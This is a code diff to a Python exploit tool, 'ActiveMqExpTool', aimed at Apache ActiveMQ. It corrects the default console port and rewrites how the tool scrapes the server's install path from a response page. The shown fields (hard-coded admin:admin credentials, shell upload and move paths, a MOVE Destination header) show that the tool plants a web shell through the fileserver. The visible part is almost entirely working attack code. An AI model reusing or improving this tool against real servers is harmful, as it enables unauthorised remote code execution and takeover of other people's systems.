@@ -32,7 +32,7 @@ class ActiveMqExpTool():
         self.base_url = ""
         self.AuthBasic = "YWRtaW46YWRtaW4=" # 默认admin:admin
         self.host = "127.0.0.1"
-        self.port = 8611
+        self.port = 8161
         self.put_file_path = "/fileserver/tmp_2016.txt"
         self.local_shell_path = ""
         self.move_shell_path = ""
@@ -156,18 +156,11 @@ Destination:#move_shell_path#
                     recv = recv + recv_temp
                     continue
         # 很笨的办法寻找安装目录，在html里面找
-        DirIndex = recv.index("user.dir")
-        tempIndex = recv.index("line.separator")
-        temptext = recv[DirIndex:tempIndex]
-        remodle_one = re.compile(r'<[^>]+>')
-        temp = remodle_one.sub("#", temptext)
-        temp_list = temp.split("#")
-        for k in temp_list:
-            if "activemq" in k or "apache" in k:
-                self.install_path = k
-        # C:\apache-activemq-5.8.0-bin\apache-activemq-5.8.0\bin\win32
-        # ['C:', 'apache-activemq-5.8.0-bin', 'apache-activemq-5.8.0', 'bin', 'win32']
-        # self.install_path = "/opt/apach-activemq-5.13/bin/"
+        DirIndex = recv.index("org.apache.activemq.util.LockFile.lock.")
+        endIndex = recv.index("kahadb")
+        tempIndex = recv[DirIndex+39:endIndex-6]
+        self.install_path = tempIndex
+
         path_list = self.install_path.split("\\")
         if len(path_list)==1:
             path_list = self.install_path.split("/")
